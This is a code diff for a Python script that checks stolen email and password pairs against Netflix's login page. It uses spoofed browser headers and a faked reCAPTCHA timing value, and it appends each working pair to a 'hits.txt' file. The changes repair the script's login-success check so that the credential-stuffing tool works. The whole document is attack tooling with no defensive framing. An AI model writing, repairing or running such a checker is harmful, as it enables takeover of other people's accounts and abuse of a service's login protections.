@@ -53,7 +53,6 @@ def check_account(email,password):
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
         "accept-language": "en-US,en;q=0.9", 
         "accept-encoding": "gzip, deflate, br", 
-        "method": "POST",
         "referer": "https://www.netflix.com/login", 
         "content-type": "application/x-www-form-urlencoded",
         "cookie":""
@@ -75,18 +74,14 @@ def check_account(email,password):
         "recaptchaResponseTime": "473"
     }
 
-    request = client.post("https://www.netflix.com/login",headers=headers,data=data).text
-    logged = client.find('name="authURL"') 
-
+    request = client.post("https://www.netflix.com/login",headers=headers,data=data)
+    logged = request.text.find('name="authURL"')
     if logged == -1:
-        print(GREEN +"[GOOD] {}:{}".format(email,password) + RESET)
+        print(GREEN +" [GOOD] {}:{} ".format(email,password) + RESET)
         file = open("hits.txt","a")
         file.write(email + ":" + password)
     else:
-        print(RED +"[BAD] {}:{}".format(email,password) + RESET)
+        print(RED +" [BAD] {}:{} ".format(email,password) + RESET)
 
 if __name__ == "__main__":
     check_file()
-
-
-
